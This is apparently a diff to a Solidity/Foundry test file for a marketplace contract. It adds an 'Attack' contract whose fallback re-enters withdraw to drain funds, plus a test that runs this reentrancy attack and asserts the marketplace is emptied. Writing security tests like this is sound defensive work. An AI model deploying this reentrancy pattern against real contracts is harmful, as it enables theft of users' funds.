@@ -4,19 +4,47 @@ pragma solidity ^0.8.13;
 import {Test, console} from "forge-std/Test.sol";
 import {Marketplace} from "../src/Marketplace.sol";
 
+// Used for reentrancy testing
+contract Attack {
+    Marketplace public marketplaceAdmin;
+    uint256 public constant amount = 1 ether;
+
+    constructor(address marketplaceAddress) {
+        marketplaceAdmin = Marketplace(marketplaceAddress);
+    }
+
+    fallback() external payable {
+        if (address(marketplaceAdmin).balance >= amount) {
+            marketplaceAdmin.withdraw(amount);
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value >= amount);
+        marketplaceAdmin.addBalance{value: amount}();
+        marketplaceAdmin.withdraw(amount);
+    }
+
+    function getBalance() public view returns (uint256) {
+        return msg.sender.balance;
+    }
+}
+
 contract MarketplaceTest is Test {
     Marketplace public marketplace;
+    Attack public attack;
 
     address public admin = address(0x01);
     address public user1 = address(0x02);
     address public user2 = address(0x03);
     address public user3 = address(0x04);
 
-    // ==Functional testing==
+    // == FUNCTIONAL TESTING ==
 
     function setUp() public {
         vm.startPrank(admin);
         marketplace = new Marketplace();
+        attack = new Attack(address(marketplace));
         vm.stopPrank();
     }
 
@@ -512,5 +540,75 @@ contract MarketplaceTest is Test {
 
         vm.stopPrank();
     }
-}
 
+    // SECURITY TESTING
+
+    // Reentrancy testing
+    function test_reentrancy() public {
+        uint256 marketplaceBalance = marketplace.getBalance();
+        uint256 attackBalance = attack.getBalance();
+
+        // assertEq(marketplaceBalance, 0);
+        assertGt(attackBalance, 1);
+
+        // Fund the attack contract with 1 ether
+        vm.deal(address(this), 1 ether);
+        payable(address(attack)).transfer(1 ether);
+
+        // Fund the marketplace contract with 2 ether from an address
+        vm.deal(user1, 2 ether);
+        vm.startPrank(user1);
+        marketplace.registerSeller();
+        marketplace.addBalance{value: 2 ether}();
+        vm.stopPrank();
+
+        // Start the attack
+        vm.startPrank(address(attack));
+        attack.attack{value: 1 ether}();
+        assertEq(marketplaceBalance, 0);
+        vm.stopPrank();
+
+        // Check if the attack was successful
+        marketplaceBalance = marketplace.getBalance();
+        attackBalance = attack.getBalance();
+
+        // Ensure that the marketplace balance is drained
+        assertEq(marketplaceBalance, 0);
+        assertGt(attackBalance, 1 ether);
+    }
+
+    // function reenttrancyattack() external payable {
+    //     require(msg.value >= 1 ether, "Send at least 1 ether to attack");
+    //     marketplace.addBalance{value: 1 ether}();
+    //     marketplace.withdrawBalance(1 ether);
+    // }
+    
+    // // Overflow and underflow testing
+    // function test_overflowUnderflow() public {
+    //     vm.startPrank(user1);
+    //     marketplace.registerSeller();
+    //     vm.stopPrank();
+
+    //     vm.startPrank(user2);
+    //     marketplace.registerBuyer();
+    //     vm.stopPrank();
+
+    //     vm.startPrank(user1);
+    //     marketplace.addItem("Item1", "Description1", 1 ether);
+    //     vm.stopPrank();
+
+    //     vm.startPrank(user2);
+    //     marketplace.addBalance{value: 1 ether}();
+    //     vm.stopPrank();
+
+    //     vm.startPrank(user2);
+    //     vm.expectRevert("SafeMath: addition overflow");
+    //     marketplace.addBalance{value: 2**256 - 1}();
+    //     vm.stopPrank();
+
+    //     vm.startPrank(user2);
+    //     vm.expectRevert("SafeMath: subtraction overflow");
+    //     marketplace.buyItem(1);
+    //     vm.stopPrank();
+    // }
+}
